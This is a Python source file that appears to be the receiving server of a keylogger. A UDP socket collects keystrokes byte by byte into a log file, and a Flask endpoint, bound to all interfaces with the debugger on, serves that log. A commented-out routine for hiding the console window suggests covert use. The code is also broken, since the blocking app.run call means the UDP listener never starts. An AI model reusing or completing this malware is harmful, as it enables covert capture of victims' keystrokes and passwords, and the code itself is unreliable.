from flask import Flask,session,jsonify, request, flash, url_for, redirect, render_template
from bs4 import BeautifulSoup
from flask import Response
import requests
import os, datetime
import time,json
import re
import socket
import sys
from optparse import OptionParser
import os, datetime
import time,json
# print datetime.datetime.now()

app = Flask(__name__)


@app.route('/', methods=['GET'])
def index():
    fp = open("keylogs.a","r")
    readd = fp.read()
    fp.close()
    html = """
    <html>
        <head></head>
        <body> {{message}}
        </body>
    </html>
    """
    return Response(readd)




def printable():
    #regular string.printable includes \n \t, etc which is a pain to escape.
    return ' '.join([chr(byte) for byte in range(256) \
                    if len(repr(chr(byte))) == 3 or byte == ord('\\')])
# #Hide Console
# def hide():
#     import win32console,win32gui
#     window = win32console.GetConsoleWindow()
#     win32gui.ShowWindow(window,0)
#     return True


if __name__ == "__main__":
    # hide()
    # port = int(os.environ.get("PORT", 5000))
    port = 2345
    app.run(host='0.0.0.0', port=port,debug=True)

    parser = OptionParser()
    parser.add_option("-s", dest='server', default='0.0.0.0', help="IP address to listen on")
    parser.add_option("-p", dest='port', default=6667,type='int', help="port number")
    (options,args) = parser.parse_args()

    sock = socket.socket(socket.AF_INET, # Internet
                         socket.SOCK_DGRAM) # UDP
    sock.bind((options.server, options.port))
    
    while True:
        data, addr = sock.recvfrom(1) # buffer size
        if data in printable():
            # sys.stdout.write("%s"% (data))
            strs = "%s "% (data)
        else:
            # sys.stdout.write("chr(%s)"% (ord(data)))
            strs = str(datetime.datetime.now())+": "+"chr(%s) "% (ord(data)) +'\n'
        fp = open("keylogs.a","a")
        fp.write(strs)
        fp.close()
        # sys.stdout.flush()